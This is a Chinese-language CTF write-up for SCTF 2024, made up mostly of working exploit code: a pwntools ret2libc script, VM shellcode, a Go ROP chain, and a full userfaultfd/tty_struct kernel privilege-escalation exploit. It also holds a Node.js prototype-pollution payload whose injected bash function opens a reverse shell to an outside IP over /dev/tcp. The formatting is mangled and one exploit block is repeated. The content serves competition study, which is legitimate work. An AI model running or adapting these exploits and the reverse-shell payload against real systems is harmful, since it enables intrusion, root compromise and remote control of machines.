---
title: UKFC2024 SCTF WP
contest: SCTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags:
- factory-menu
- custom-vm-shellcode
- go-string-rodata
- kernel-uffd-modprobe
- prototypeless-spawn
- rsa-continued-fraction
- snow3g-lfsr
attack_chain:
- 'factory (Pwn): "How many factorys do you want to build" 菜单 + 38 项'
- 24 触发 sort + pop rdi + puts_got 泄 libc
- libc_base = puts - sym['puts']
- 第二次 24 触发 pop rdi + ret + system + /bin/sh
- 自定义 VM 21 个 opcode 0x23-0x33 (xor/exch/push/low_8/shr/shl/rotate/and/syscall)
- shellcode = b'\x28\x26flag' + xor + syscall 调 open+sendfile
- Go 字符串在 .rodata 用 x00 填充 + 拼接 gadget 地址 poprax
- /bin/sh/bin/sh/...` 重复拼接 rax / rdi / rsi
- 'Kernel: userfaultfd + modprobe_path 劫持 tty_struct'
- tty_fd=open("/dev/ptmx", O_RDWR)
- fake_ops[12] = WORK_FOR_CPU_FN + commit_creds(0) + init_cred
- work_for_cpu_fn 0xffffffff810bd960 (magic 跳转)
- 'Web ExP0rtApi: file.replace(/\.\.\//g, '''') 替换绕过 → 改 __proto__ prototype 污染'
- '{user: "__proto__", date: 2, reportmessage: {shell: "/bin/bash", env: {BASH_FUNC_whoami%%: ...}}}'
- 通过 require-in-the-middle 拦截 child_process spawn
- prototypelessSpawnOpts = Object.create(null) 防止 prototype 锁
- 'Crypto: N+1 窗口 RSA gift 解 p,q (连分数展开)'
- 雪花 3G LFSR 解密 (32 bit 输出 + 1 bit 输入)
key_payload: 'tty_struct[12] = WORK_FOR_CPU_FN  # kernel EoP'
one_liner: SCTF 2024：factory 菜单 ret2libc + 自定义 VM shellcode + Go .rodata 拼接 + 内核 userfaultfd tty 劫持。
lesson: tty_struct[12] = work_for_cpu_fn + commit_creds(0) 是 Linux 内核 EoP 经典手法。
quality: high
full_path: UKFC2024_SCTF_WP.full.md
meta_path: UKFC2024_SCTF_WP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'UKFC2024 SCTF WP。SCTF 2024：factory 菜单 ret2libc + 自定义 VM shellcode + Go .rodata 拼接 + 内核 userfaultfd tty 劫持。。关键路径：factory (Pwn): "How many factorys do you want to build" 菜单 + 38 项 → 24 触发 sort + po...'
category: web
subcategory: web_other
tools_used:
- Go
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/208397.html
reasoning_chain:
- factory → menu 38 项 'How many factorys do you want to build' → 触发点：sort 函数 24 触发溢出
- 假设：sort 触发栈溢出 → 动作：pop_rdi + puts_got 泄 libc → 观察：libc_base = puts - sym['puts']
- 第二次 24 触发 → pop_rdi + ret + system + /bin/sh → flag
- 自定义 VM 21 opcode 0x23-0x33 → 假设：字节码 VM → 动作：shellcode = '\x28\x26flag' + xor + syscall
- 观察：open + sendfile 读 flag → 弹回
- Go .rodata 拼接 → /bin/sh 重复 12 次 + poprax gadget → 假设：填满 rax 调 execve
- 'Kernel: userfaultfd + modprobe_path 劫持 tty_struct → 触发点：经典 EoP 路径'
- tty_fd=open('/dev/ptmx', O_RDWR) → fake_ops[12] = WORK_FOR_CPU_FN → commit_creds(0) → init_cred
- ExP0rtApi → file.replace(/\.\.\//g, '') → 假设：绕过后再 prototype 污染 → 动作：require-in-the-middle
- RSA → N+1 窗口 gift → 假设：连分数展开解 p,q
- Snow3G LFSR → 32 bit 输出 + 1 bit 输入 → 假设：流密码可还原
failed_attempts:
- 试图直接 ret2libc factory → 失败：菜单 38 项限制每次溢出位置
- 试图用普通 mmap 调 openat → 失败：必须先写 shellcode VM
key_observations:
- tty_struct[12] = work_for_cpu_fn + commit_creds(0) 是 Linux 内核 EoP 经典手法
- Go string 在 .rodata 用 x00 padding 拼接是 Go 二进制逆向特点
- require-in-the-middle 是 Node.js prototype pollution 攻击链关键
- RSA N+1 窗口 gift 用连分数展开解 p,q 是经典数论
prerequisites:
- ret2libc 多阶段（先 leak 再 ROP）
- Go 二进制 .rodata 字符串拼接
- Linux 内核 userfaultfd + tty_struct 利用
- RSA 连分数展开解 p,q
---
# UKFC2024 SCTF WP

> 原文: https://www.ctfiot.com/208397.html
> ID: 208397

from pwn import *context(os='linux',arch='amd64',log_level='debug')
ifremote=0if ifremote==1: io=remote('1.95.81.93',57777)else: io=process('./factory')
elf = ELF('./factory')libc=ELF("./libc.so.6")#libc=ELF("./libc-2.23.so")def debug(): gdb.attach(io) pause()
debug()s = lambda x : io.send(x)sl = lambda x : io.sendline(x)sa = lambda x , y : io.sendafter(x , y)sla = lambda x , y : io.sendlineafter(x , y)r = lambda x : io.recv(x)ru = lambda x : io.recvuntil(x)rl = lambda x : io.recvlint()
#b *0x401378sla(b'How many factorys do you want to build: ',str(38))
for i in range(20): sa(b' = ',b'n')pause()sa(b' = ',b'24')
puts_got=elf.got['puts']puts_plt=elf.plt['puts']main_addr=elf.sym['main']pop_rdi=0x0000000000401563sa(b' = ',b'n')sa(b' = ',str(0x0000000000401563))sa(b' = ',str(0x0000000000401563))sa(b' = ',str(puts_got))sa(b' = ',str(puts_plt))sa(b' = ',str(main_addr))
for i in range(7): sa(b' = ',b'n')
puts_addr=u64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))print("puts_addr==============>",hex(puts_addr))
libc_base=puts_addr-libc.sym['puts']system_addr=libc_base+libc.sym['system']binsh_addr=libc_base+0x1b45bd
sla(b'How many factorys do you want to build: ',str(38))
for i in range(20): sa(b' = ',b'n')sa(b' = ',b'24')
puts_got=elf.got['puts']puts_plt=elf.plt['puts']main_addr=elf.sym['main']pop_rdi=0x0000000000401563sa(b' = ',b'n')ret=0x000000000040101asa(b' = ',str(0x0000000000401563))sa(b' = ',str(0x0000000000401563))sa(b' = ',str(binsh_addr))sa(b' = ',str(ret))sa(b' = ',str(system_addr))sa(b' = ',str(main_addr))
for i in range(6): sa(b' = ',b'n')io.interactive()

rsi = opcode offset //确定 code 中下一个应执行 opcode 的位置
rdi = stack offset //自定义栈起始位置与 stack 其实位置的偏移
xxx s0 xxx-8 s1 raxxxx-10 s2 rdixxx-18 s3 rsixxx-20 s4 rdx//在自定义栈上的变量位置以及在执行系统调用时对应的寄存器
opcode - offset - addr - func0x23 - 0x6d - 0x12a7 - xor s1 s2 -> s2 //异或0x24 - 0x8a- 0x12c4 - s1 <-> s3 //交换0x25 - 0xa6 - 0x12e0 - s1 <-> s20x26 - 0xc2 - 0x12fc - put 4byte from code to stack0x27 - 0xdf - 0x1319 - s1 -> s1 low 8 bit //保留低八位0x28 - 0xf4 - 0x132e - control stack offset--0x29 - 0xf8 - 0x1332 - shr s1 80x2a - 0x10e - 0x1348 - control stack offset++ & s1 值迁移至新地址 0x2b - 0x122 - 0x135c - shl s1 80x2c - 0x138 - 0x1372 - control stack offset-- & s1 -> rax0x2d - 0x169 - 0x13a3 - ror s1 s2l0x2e - 0x186 - 0x13c0 - rol s1 s2l0x2f - 0x1a3 - 0x13dd - and s1 s2 -> s20x30 - 0x1c0 - 0x13fa - syscall0x31 - 0x1eb - 0x1425 - s1addr -> s0(debug得出)0x32 - 0x1ff - 0x1439 - use to continue0x33 - 0x218 - - exit

from pwn import *
context( os = 'linux', arch = 'amd64', log_level = 'debug' )
#io = process('./pwn')io = remote('1.95.68.23',58924)
def dbg(): gdb.attach(io) pause()

shellcode = b'x28x26flag'shellcode += b'x2ax28x31'shellcode += b'x2ax2ax2ax23x24x2ax2ax23x24'shellcode += b'x28x26x02x00x00x00'shellcode += b'x30'
shellcode += b'x31x29x2bx25x24x29x29x29x24'shellcode += b'x2ax29'shellcode += b'x30'
shellcode += b'x31x29x2bx2ax28x26x50x00x00x00x24x26x01x00x00x00x25x28x26x01x00x00x00x30'
io.sendlineafter(b'she',shellcode)
io.interactive()

https://github.com/wa-lang/ugo

package main
func function() string {
 return "/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh"}
func main() {
 var a string = function() // Capture the return value from function a = "x00x00x00x00x00x00x00x00xe7x7ax44x00x00x00x00x00x3bx00x00x00x00x00x00x00x16x10x40x00x00x00x00x00x00x00x00x00x00x00x00x00x94xb5x44x00x00x00x00x00x96x80x49x00x00x00x00x00"
 return 0}// a =''//rdx // a = a + "xe7x7ax44x00x00x00x00x00"/poprax// a = a + "x3bx00x00x00x00x00x00x00" //rax// a = a + "x16x10x40x00x00x00x00x00" //0x0000000000401016 add rsp 8 ret// a = a + "x00x00x00x00x00x00x00x00" //rsi// a = a + "x94xb5x44x00x00x00x00x00" //0x000000000044b594 poprdi syscall// a = a + "x56x80x49x00x00x00x00x00" //rdi

#include "sekiro.h"
#define COMMIT_CREDS 0xFFFFFFFF81097D00 #define INIT_CRED 0xFFFFFFFF82448CC0#define WORK_FOR_CPU_FN 0xffffffff810bd960#define POP_RDI_RET 0xffffffff81008989#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81C00aa5#define addrsp_0x1a0 0xffffffff816319d9#define addrsp_0x1b0 0xffffffff8114f5b2#define SWAPGS 0xffffffff8105c8f0int fd_vuln;char* uffd_buf_hijack;
size_t heapaddr;
struct request{ char *rd; size_t a1; size_t a2; size_t a3; size_t a4; size_t a5;
};
void get_shell() { system("/bin/sh");}size_t user_cs, user_rflags, user_sp, user_ss;
void save_status() { __asm__("mov user_cs, cs;" "mov user_ss, ss;" "mov user_sp, rsp;" "pushf;" "pop user_rflags;"); puts("[*] status has been saved.");}
void err_exit(char *msg){ printf(" 33[31m 33[1m[x] Error at:  33[0m%sn", msg); sleep(5); exit(EXIT_FAILURE);}
void info(char *msg){ printf(" 33[32m 33[1m[+] %sn 33[0m", msg);}
void hexx(char *msg, size_t value){ printf(" 33[32m 33[1m[+] %s: %#lxn 33[0m", msg, value);}
/* bind the process to specific core */void bind_core(int core){ cpu_set_t cpu_set;
 CPU_ZERO(&cpu_set); CPU_SET(core, &cpu_set); sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
 printf(" 33[34m 33[1m[*] Process binded to core  33[0m%dn", core);}
void get_flag(){ system("echo -ne '#!/bin/shn/bin/chmod 777 /flag' > /tmp/x"); system("chmod +x /tmp/x"); system("echo -ne '\xff\xff\xff\xff' > /tmp/sekiro"); system("chmod +x /tmp/sekiro"); system("/tmp/sekiro"); sleep(0.3); system("cat /flag"); exit(0);}size_t orignal[0x30];pthread_t pwn;
size_t uffd_buf[512];
size_t kernel_offset ;
int tty_fd;
void hijack_handler(void *args){ int uffd = (int)args; struct uffd_msg msg; struct uffdio_copy uffdio_copy;
 for (;;) { struct pollfd pollfd; pollfd.fd = uffd; pollfd.events = POLLIN; if (poll(&pollfd, 1, -1) == -1) err_exit("Failed to exec poll for leak_handler");
 int res = read(uffd, &msg, sizeof(msg)); if (res == 0) err_exit("EOF on userfaultfd for leak_handler"); if (res == -1) err_exit("ERROR on userfaultfd for leak_handler"); if (msg.event != UFFD_EVENT_PAGEFAULT) err_exit("INCORRET EVENT in leak_handler"); // operation info("hijack the kernel in userfaultfd -- hijack_handler"); del();
 tty_fd=open("/dev/ptmx", O_RDWR); // size_t fake_ops[16] = { 0 }; // fake_ops[12] = WORK_FOR_CPU_FN+kernel_offset; uffd_buf[0]=0x100005401; uffd_buf[1]=addrsp_0x1a0 +kernel_offset; uffd_buf[2]=heapaddr+(0xffff88800e11a6c0-0xffff88800e3d2800); uffd_buf[3] = heapaddr+0x8-0x60; uffd_buf[4] = COMMIT_CREDS+kernel_offset; uffd_buf[5] = INIT_CRED+kernel_offset;
 // printf("fake_ops->ioctl: %#lxn", fake_ops[12]); // printf("fake_ops: %#lxn", fake_ops); uffdio_copy.src = uffd_buf; uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(0x1000 - 1); uffdio_copy.len = 0x1000; uffdio_copy.mode = 0; uffdio_copy.copy = 0; if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) err_exit("Failed to exec ioctl for UFFDIO_COPY in leak_handler"); }}
void register_userfaultfd(void *uffd_buf, pthread_t pthread_moniter, void *handler){ int uffd; struct uffdio_api uffdio_api; struct uffdio_register uffdio_register;
 uffd = syscall(__NR_userfaultfd, O_NONBLOCK | O_CLOEXEC); if (uffd == -1) err_exit("syscall for userfaultfd ERROR in register_userfaultfd func");
 uffdio_api.api = UFFD_API; uffdio_api.features = 0; if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) err_exit("ioctl for UFFDIO_API ERROR");
 uffdio_register.range.start = (unsigned long long)uffd_buf; uffdio_register.range.len = 0x1000; uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) err_exit("ioctl for UFFDIO_REGISTER ERROR");
 int res = pthread_create(&pthread_moniter, NULL, handler, uffd); if (res == -1) err_exit("pthread_create ERROR in register_userfaultfd func");}size_t koffset;
size_t add(){
 char *addr = malloc(8); // 分配 8 字节
 struct request req={.a5=&addr}; while (1) { int res=ioctl(fd_vuln,0xFFF0,&req); //printf("%d n",res); if(res!=-1){ printf("success!n"); hexx("heap addr", addr); //getchar(); break; } } return addr;
 }void del(){
 struct request req={0}; while (1) { int res=ioctl(fd_vuln,0xFFF1,&req); //printf("%d n",res); if(res!=-1){ printf("success!n"); break; } } }size_t swapgs_restore_regs_and_return_to_usermode;
size_t init_cred;
size_t pop_rdi_ret;
size_t commit_creds;
size_t iretq;
size_t poprsp;
size_t ret;
size_t swapgs;
int main(){ save_status(); int packet_fd; size_t leak, kernel_base; char data[0x200]; char buf[0x20]; size_t rebuf[0x10]; bind_core(0); fd_vuln = open("/dev/ksctf", 2); int note_fd = open("/sys/kernel/notes", O_RDONLY); read(note_fd, data, 0x100); //hexdump(data, 0x100);0xffffffff81002000
 memcpy(&leak, &data[0x84], 8); hexx("leak", leak); kernel_base = leak - 0x19e1180; hexx("kernel_base", kernel_base); kernel_offset = kernel_base - 0xffffffff81000000; hexx("kernel_offset", kernel_offset); heapaddr=add(); uffd_buf_hijack = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); register_userfaultfd(uffd_buf_hijack, &pwn, hijack_handler); pop_rdi_ret =POP_RDI_RET+kernel_offset; ret=pop_rdi_ret+1; init_cred =INIT_CRED+kernel_offset; commit_creds=COMMIT_CREDS+kernel_offset; swapgs_restore_regs_and_return_to_usermode=SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE+kernel_offset; iretq=0xffffffff81009069+kernel_offset; swapgs=SWAPGS+kernel_offset; size_t gs=(size_t) get_shell; write(fd_vuln,uffd_buf_hijack,0x40); add(); poprsp=0xffffffff81000401+kernel_offset; size_t *rop [0x30], it=0;
 rop[it++] = pop_rdi_ret; rop[it++] = init_cred; rop[it++] = commit_creds; rop[it++] = swapgs ; rop[it++] = iretq; rop[it++] = (size_t) get_shell; rop[it++] = user_cs; rop[it++] = user_rflags; rop[it++] = user_sp; rop[it++] = user_ss; write(fd_vuln,rop,0x50); heapaddr+=0x800; __asm__( "mov r15, poprsp;" "mov r14, poprsp;" "mov r13, heapaddr;" "mov rax, 0x10;" "mov rdx, 8;" "mov rsi, rsp;"
 ); return 0;}

Cannot read properties of undefined (reading 'replace'),ExP0rtApi?v=./&f=app.js

const express = require('express');
const fs = require('fs');
const nodeRsa = require('node-rsa');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const SECRET_KEY = crypto.randomBytes(16).toString('hex');
const path = require('path');
const zlib = require('zlib');
const mysql = require('mysql');
const handle = require('./handle');
const cp = require('child_process');
const cookieParser = require('cookie-parser');
// MySQL connectionconst con = mysql.createConnection({ host: 'localhost', user: 'ctf', password: 'ctf123123', port: '3306', database: 'sctf'});
con.connect((err) => { if (err) { console.error('Error connecting to MySQL:', err.message); setTimeout(con.connect(), 2000); // Retry connection after 2 seconds } else { console.log('Connected to MySQL'); }});
// RSA key generationconst key = new nodeRsa({ b: 1024 });key.setOptions({ encryptionScheme: 'pkcs1' });
const publicPem = `-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2ICXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGeI+Atul1rSE0APhHoPwIDAQAB-----END PUBLIC KEY-----`;
const privatePem = `-----BEGIN PRIVATE KEY-----MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87li+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgIlYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFYJal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kGmhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2yeKmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqhUvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8lzIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOgxu/vfQ0A1jHRNC7t-----END PRIVATE KEY-----`;
// Express app setupconst app = express();app.use(bodyParser.json());app.use(express.urlencoded({ extended: true }));app.use(express.static(path.join(__dirname, 'static')));app.use(cookieParser());
let Reportcache = {};
// Middleware to verify adminfunction verifyAdmin(req, res, next) { const token = req.cookies['auth_token'];
 if (!token) { return res.status(403).json({ message: 'No token provided' }); }
 jwt.verify(token, SECRET_KEY, (err, decoded) => { if (err) { return res.status(403).json({ message: 'Failed to authenticate token' }); }
 if (decoded.role !== 'admin') { return res.status(403).json({ message: 'Access denied. Admins only.' }); }
 req.user = decoded; next(); });}
// Routesapp.get('/hello', (req, res) => { res.send('<h1>Welcome Admin!!!</h1>
');});
app.get('/config', (req, res) => { res.json({ publicKey: publicPem });});
const decrypt = function(body) { try { const pem = privatePem; const key = new nodeRsa(pem, { encryptionScheme: 'pkcs1', b: 1024 }); key.setOptions({ environment: "browser" }); return key.decrypt(body, 'utf8'); } catch (e) { console.error("decrypt error", e); return false; }};
app.post('/login', (req, res) => { const encryptedPassword = req.body.password; const username = req.body.username;
 try { const passwd = decrypt(encryptedPassword); if (username === 'admin') { const sql = `SELECT (SELECT password FROM user WHERE username = 'admin') = '${passwd}';`; con.query(sql, (err, rows) => { if (err) throw new Error(err.message); if (rows[0][Object.keys(rows[0])]) { const token = jwt.sign({ username, role: username }, SECRET_KEY, { expiresIn: '1h' }); res.cookie('auth_token', token, { secure: false }); res.status(200).json({ success: true, message: 'Login Successfully' }); } else { res.status(200).json({ success: false, message: 'Error Password!' }); } }); } else { res.status(403).json({ success: false, message: 'This Website Only Open for admin' }); } } catch (error) { res.status(500).json({ success: false, message: 'Error decrypting password!' }); }});
app.get('/ExP0rtApi', (req, res) => { let rootpath = req.query.v; let file = req.query.f;
 file = file.replace(/\.\.\//g, ''); rootpath = rootpath.replace(/\.\.\//g, '');
 if (rootpath === '') { if (file === '') { return res.status(500).send('Try to find parameters HaHa'); } else { rootpath = "static"; } }
 const filePath = path.join(__dirname, rootpath + "/" + file);
 if (!fs.existsSync(filePath)) { return res.status(404).send('File not found'); }
 fs.readFile(filePath, (err, fileData) => { if (err) { console.error('Error reading file:', err); return res.status(500).send('Error reading file'); }
 zlib.gzip(fileData, (err, compressedData) => { if (err) { console.error('Error compressing file:', err); return res.status(500).send('Error compressing file'); } const base64Data = compressedData.toString('base64'); res.send(base64Data); }); });});
app.get("/report", (req, res) => { res.sendFile(path.join(__dirname, "static", "report_noway_dirsearch.html"));});
app.post("/report", verifyAdmin, (req, res) => { const { user, date, reportmessage } = req.body; if (Reportcache[user] === undefined) { Reportcache[user] = {}; } Reportcache[user][date] = reportmessage; res.status(200).send("<script>alert('Report Success');window.location.href='/report'</script>");});
app.get('/countreport', (req, res) => { let count = 0; for (const user in Reportcache) { count += Object.keys(Reportcache[user]).length; } res.json({ count });});
// Check current running userapp.get("/VanZY_s_T3st", (req, res) => { const command = 'whoami'; const cmd = cp.spawn(command, []); cmd.stdout.on('data', (data) => { res.status(200).end(data.toString()); });});
// Start serverapp.listen(3000, () => { console.log('Server running on http://localhost:
3000');});再读取一下require里的handle/index.js和child_process.jsindex.js,封装了一下child_processvar ritm = require('require-in-the-middle');var patchChildProcess = require('./child_process');new ritm.Hook( ['child_process'], function (module, name) { switch (name) { case 'child_process': { return patchChildProcess(module); } } });child_process.jsfunction patchChildProcess(cp) { cp.execFile = new Proxy(cp.execFile, { apply: patchOptions(true) }); cp.fork = new Proxy(cp.fork, { apply: patchOptions(true) }); cp.spawn = new Proxy(cp.spawn, { apply: patchOptions(true) }); cp.execFileSync = new Proxy(cp.execFileSync, { apply: patchOptions(true) }); cp.execSync = new Proxy(cp.execSync, { apply: patchOptions() }); cp.spawnSync = new Proxy(cp.spawnSync, { apply: patchOptions(true) }); return cp;}
function patchOptions(hasArgs) { return function apply(target, thisArg, args) { var pos = 1; if (pos === args.length) { args[pos] = prototypelessSpawnOpts(); } else if (pos < args.length) { if (hasArgs && (Array.isArray(args[pos]) || args[pos] == null)) { pos++; } if (typeof args[pos] === 'object' && args[pos] !== null) { args[pos] = prototypelessSpawnOpts(args[pos]); } else if (args[pos] == null) { args[pos] = prototypelessSpawnOpts(); } else if (typeof args[pos] === 'function') { args.splice(pos, 0, prototypelessSpawnOpts()); } } return target.apply(thisArg, args); };}function prototypelessSpawnOpts(obj) { var prototypelessObj = Object.assign(Object.create(null), obj); prototypelessObj.env = Object.assign(Object.create(null), prototypelessObj.env || process.env); return prototypelessObj;}module.exports = patchChildProcess;

function prototypelessSpawnOpts(obj) { var prototypelessObj = Object.assign(Object.create(null), obj); prototypelessObj.env = Object.assign(Object.create(null), prototypelessObj.env || process.env); return prototypelessObj;}

{ "user": "__proto__", "date": 2, "reportmessage": { "shell": "/bin/bash", "env": { "BASH_FUNC_whoami%%": "() { bash -c 'bash -i >& /dev/tcp/12.34.56.78/2333 0>&1'; }" } }}

#include<stdio.h> #include<stdlib.h> #include<stdint.h>uint32_t decrypt(uint32_t res) { for (int i = 0; i < 32;i++) { if (res % 2 == 0) { res /= 2; }else { res ^= 0x85B6874F; res /= 2; res |=(1 << 31); } } return res;}int main(){ unsigned int data[10] = { 0xA3C8C033, 0x1A1DBFF3, 0xC6B7413B, 0x52865EF1, 0x1E6BCF52, 0xBFCBF9C5, 0xF1627BED, 0x544843F7, 0xD94C85FB, 0x6EF23035}; int key[]={ };//动调获取 int flagg[]={0x56, 0x74, 0x5A, 0x67, 0x55, 0x6E, 0x73, 0x2F, 0x55, 0x67, 0x7E, 0x2C, 0x56, 0x6E, 0x6D, 0x68, 0x56, 0x67, 0x77, 0x65, 0x55, 0x5D, 0x48, 0x2D, 0x54, 0x74, 0x71, 0x34, 0x56, 0x5D, 0x56, 0x66, 0x55, 0x74, 0x4D, 0x2E, 0x54, 0x6E, 0x5C, 0x26}; char flag[40]; for (int i = 0; i < 10;i++) { uint32_t result = decrypt(data[i]); int temp[4]; for (int j=0;j<4;j++){ temp[j]=result&0xff; result>>=8; } for (int j=0;j<4;j++){ temp[j]^=key[i*4+j]; temp[j]^=30; printf("%c",temp[j]); } } return 0;}

from Crypto.Util.number import long_to_bytes
from sympy import symbols, Eq, solve
from hashlib import md5
N = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840
#连分数展开
def continued_fraction(numerator, denominator): while denominator: quotient, remainder = divmod(numerator, denominator) yield quotient numerator, denominator = denominator, remainder
# 逐步分数近似
def convergents(continued_fraction_seq): num1, num2 = 1, 0 den1, den2 = 0, 1 for q in continued_fraction_seq: num1, num2 = q * num1 + num2, num1 den1, den2 = q * den1 + den2, den1 yield num1, den1
# 求解 d 和 k 的有效值
def find_valid_gifts(e, N): frac_gen = continued_fraction(e, N**2) for k, d in convergents(frac_gen): if k == 0 or (e * d - 1) % k != 0: continue yield (e * d - 1) // k
# 通过 gift 求解 p 和 q
def solve_pq(N, gift): p, q = symbols('p q') eq1 = Eq(N, p * q) eq2 = Eq((p**2 + p + 1) * (q**2 + q + 1), gift) return solve([eq1, eq2], (p, q))
# 主逻辑valid_gifts = list(find_valid_gifts(e, N))print(f"找到的有效 gift 值: {valid_gifts}")
# 仅演示第一个 gift 的 p, q 解法for tmp in valid_gifts: solutions = solve_pq(N, tmp) print(f"对于 gift={tmp}，求解的 p 和 q 为: {solutions}")
# 示例输出 flagp_candidate = 5984758006806378809956519900535567746479053908385004504598524889746027259134602871258417614666511624425382102292754198444334667792470478919346145707972191p_bytes = long_to_bytes(int(p_candidate))flag = 'SCTF{' + md5(p_bytes).hexdigest() + '}'print("生成的 flag:", flag)


```
from pwn import *context(os='linux',arch='amd64',log_level='debug')
ifremote=0if ifremote==1: io=remote('1.95.81.93',57777)else: io=process('./factory')
elf = ELF('./factory')libc=ELF("./libc.so.6")#libc=ELF("./libc-2.23.so")def debug(): gdb.attach(io) pause()
debug()s = lambda x : io.send(x)sl = lambda x : io.sendline(x)sa = lambda x , y : io.sendafter(x , y)sla = lambda x , y : io.sendlineafter(x , y)r = lambda x : io.recv(x)ru = lambda x : io.recvuntil(x)rl = lambda x : io.recvlint()
    #b *0x401378sla(b'How many factorys do you want to build: ',str(38))
for i in range(20): sa(b' = ',b'n')pause()sa(b' = ',b'24')
puts_got=elf.got['puts']puts_plt=elf.plt['puts']main_addr=elf.sym['main']pop_rdi=0x0000000000401563sa(b' = ',b'n')sa(b' = ',str(0x0000000000401563))sa(b' = ',str(0x0000000000401563))sa(b' = ',str(puts_got))sa(b' = ',str(puts_plt))sa(b' = ',str(main_addr))
for i in range(7): sa(b' = ',b'n')
puts_addr=u64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))print("puts_addr==============>",hex(puts_addr))
libc_base=puts_addr-libc.sym['puts']system_addr=libc_base+libc.sym['system']binsh_addr=libc_base+0x1b45bd
sla(b'How many factorys do you want to build: ',str(38))
for i in range(20): sa(b' = ',b'n')sa(b' = ',b'24')
puts_got=elf.got['puts']puts_plt=elf.plt['puts']main_addr=elf.sym['main']pop_rdi=0x0000000000401563sa(b' = ',b'n')ret=0x000000000040101asa(b' = ',str(0x0000000000401563))sa(b' = ',str(0x0000000000401563))sa(b' = ',str(binsh_addr))sa(b' = ',str(ret))sa(b' = ',str(system_addr))sa(b' = ',str(main_addr))
for i in range(6): sa(b' = ',b'n')io.interactive()
rsi = opcode offset //确定 code 中下一个应执行 opcode 的位置
rdi = stack offset //自定义栈起始位置与 stack 其实位置的偏移
xxx s0 xxx-8 s1 raxxxx-10 s2 rdixxx-18 s3 rsixxx-20 s4 rdx//在自定义栈上的变量位置以及在执行系统调用时对应的寄存器
opcode - offset - addr - func0x23 - 0x6d - 0x12a7 - xor s1 s2 -> s2 //异或0x24 - 0x8a- 0x12c4 - s1 <-> s3 //交换0x25 - 0xa6 - 0x12e0 - s1 <-> s20x26 - 0xc2 - 0x12fc - put 4byte from code to stack0x27 - 0xdf - 0x1319 - s1 -> s1 low 8 bit //保留低八位0x28 - 0xf4 - 0x132e - control stack offset--0x29 - 0xf8 - 0x1332 - shr s1 80x2a - 0x10e - 0x1348 - control stack offset++ & s1 值迁移至新地址 0x2b - 0x122 - 0x135c - shl s1 80x2c - 0x138 - 0x1372 - control stack offset-- & s1 -> rax0x2d - 0x169 - 0x13a3 - ror s1 s2l0x2e - 0x186 - 0x13c0 - rol s1 s2l0x2f - 0x1a3 - 0x13dd - and s1 s2 -> s20x30 - 0x1c0 - 0x13fa - syscall0x31 - 0x1eb - 0x1425 - s1addr -> s0(debug得出)0x32 - 0x1ff - 0x1439 - use to continue0x33 - 0x218 - - exit
from pwn import *
context( os = 'linux', arch = 'amd64', log_level = 'debug' )
    #io = process('./pwn')io = remote('1.95.68.23',58924)
def dbg(): gdb.attach(io) pause()

